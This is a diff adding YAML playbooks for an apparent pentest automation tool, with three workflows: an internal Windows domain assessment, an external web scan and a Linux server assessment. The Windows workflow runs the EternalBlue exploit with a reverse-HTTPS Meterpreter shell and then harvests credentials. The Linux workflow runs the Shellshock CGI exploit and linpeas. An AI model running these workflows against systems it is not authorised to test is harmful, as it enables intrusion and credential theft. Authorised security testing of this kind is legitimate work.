@@ -1,0 +1,44 @@
+name: "Internal Windows Domain Assessment"
+description: "Complete internal Windows domain pentest workflow"
+steps:
+  - recon: {nmap: {target: "10.0.0.0/24", ports: "1-10000"}}
+  - recon: {smb: {target: "10.0.0.0/24"}}
+  - recon: {suggest_exploits: true}
+  - pause: {message: "Review recon results before exploiting"}
+  - exploit:
+      module: "exploit/windows/smb/ms17_010_eternalblue"
+      options: {RHOSTS: "10.0.0.50", LHOST: "10.0.0.5"}
+      payload: "windows/x64/meterpreter/reverse_https"
+      payload_options: {LHOST: "10.0.0.5", LPORT: 8443}
+  - privesc: {session: "1", action: "quick_check"}
+  - privesc: {session: "1", action: "suggester"}
+  - session: {session: "1", post_category: "enumerate"}
+  - session: {session: "1", post_category: "credentials"}
+  - pause: {message: "Review harvested credentials before lateral movement"}
+  - report: {format: "html"}
+
+---
+name: "Quick External Web Assessment"
+description: "Recon and vuln assessment of external web targets"
+steps:
+  - recon: {nmap: {target: "example.com", ports: "1-1000"}}
+  - recon: {headers: {target: "https://example.com"}}
+  - recon: {dirs: {target: "https://example.com"}}
+  - recon: {dns: {domain: "example.com"}}
+  - pause: {message: "Review findings"}
+  - report: {format: "html"}
+
+---
+name: "Linux Server Assessment"
+description: "Full Linux server pentest"
+steps:
+  - recon: {nmap: {target: "10.0.0.100", ports: "1-65535", scan_type: "-sV -sC -O -T4"}}
+  - recon: {suggest_exploits: true}
+  - pause: {message: "Review before exploitation"}
+  - exploit:
+      module: "exploit/linux/http/apache_mod_cgi_bash_env_exec"
+      options: {RHOSTS: "10.0.0.100", LHOST: "10.0.0.5"}
+  - privesc: {session: "1", action: "linpeas"}
+  - privesc: {session: "1", action: "suggester"}
+  - session: {session: "1", post_category: "enumerate"}
+  - report: {format: "html"}
